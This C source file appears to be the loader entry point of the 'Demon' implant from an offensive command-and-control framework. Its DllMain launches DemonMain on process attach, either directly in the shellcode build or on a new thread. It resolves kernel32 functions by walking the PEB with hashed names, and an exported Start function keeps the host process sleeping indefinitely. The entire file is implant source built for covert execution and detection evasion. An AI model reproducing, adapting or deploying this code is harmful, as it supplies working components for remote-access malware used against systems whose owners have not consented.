#include <Demon.h>

#include <common/Defines.h>

#ifndef SHELLCODE

/* Instance-free PEB walker for use before DemonMain sets up the global Instance.
 * LdrModulePeb dereferences Instance->Teb which is NULL at DllMain/Start time. */
static PVOID FindModulePeb( DWORD Hash )
{
    PLDR_DATA_TABLE_ENTRY Ldr = NULL;
    PLIST_ENTRY           Hdr = NULL;
    PLIST_ENTRY           Ent = NULL;
    PPEB                  Peb = NULL;

    Peb = NtCurrentTeb()->ProcessEnvironmentBlock;
    Hdr = & Peb->Ldr->InLoadOrderModuleList;
    Ent = Hdr->Flink;

    for ( ; Hdr != Ent ; Ent = Ent->Flink ) {
        Ldr = C_PTR( Ent );

        if ( ( HashEx( Ldr->BaseDllName.Buffer, Ldr->BaseDllName.Length, TRUE ) == Hash ) || Hash == 0 ) {
            return Ldr->DllBase;
        }
    }

    return NULL;
}

static DWORD WINAPI DemonMainThread( LPVOID lpParam )
{
    DemonMain( lpParam, NULL );
    return 0;
}

DLLEXPORT VOID Start( )
{
    PVOID Kernel32  = FindModulePeb( H_MODULE_KERNEL32 );
    VOID ( WINAPI *DoSleep ) (
        DWORD
    ) = LdrFunctionAddr( Kernel32, H_FUNC_SLEEP );

    while ( TRUE ) {
        DoSleep( 24 * 60 * 60 * 1000 );
    }
}
#endif

DLLEXPORT BOOL WINAPI DllMain(
    IN     HINSTANCE hDllBase,
    IN     DWORD     Reason,
    _Inout_ LPVOID    Reserved
) {
    PVOID Kernel32 = NULL;

    if ( Reason == DLL_PROCESS_ATTACH )
    {

#if !defined(SHELLCODE) && defined(DEBUG)
        AllocConsole();
        freopen( "CONOUT$", "w", stdout );
#endif

#ifdef SHELLCODE
        DemonMain( hDllBase, Reserved );
#else
        Kernel32 = FindModulePeb( H_MODULE_KERNEL32 );
        HANDLE ( WINAPI *NewThread ) (
                LPSECURITY_ATTRIBUTES,
                SIZE_T,
                LPTHREAD_START_ROUTINE,
                LPVOID,
                DWORD,
                LPDWORD
        ) = LdrFunctionAddr( Kernel32, H_FUNC_CREATETHREAD );

        NewThread( NULL, 0, C_PTR( DemonMainThread ), hDllBase, 0, NULL );
#endif
        return TRUE;
    }

    return FALSE;
}
